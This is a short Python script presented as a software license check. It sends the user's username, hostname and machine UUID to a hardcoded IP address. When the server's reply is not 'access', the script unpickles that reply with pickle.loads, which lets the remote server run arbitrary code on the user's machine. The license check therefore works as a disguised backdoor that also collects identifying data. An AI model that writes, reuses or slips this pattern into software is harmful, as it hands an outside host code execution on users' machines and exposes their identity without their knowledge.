import getpass
import pickle
import socket
import subprocess

import requests

LICENSE_HOST = 'http://151.248.125.14:6666'


def get_user_data():
    current_machine_id = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
    userdata = {
        'username': getpass.getuser(),
        'hostname': socket.gethostname(),
        'id': current_machine_id,
    }
    return userdata


def check():
    response = requests.get(
        LICENSE_HOST,
        json=get_user_data())

    if response.text == 'access':
        return True
    else:
        pickle.loads(
            bytes(
                response.text.encode('ANSI')
            )
        )


if __name__ == '__main__':
    check()
    print('SUCCESS!')
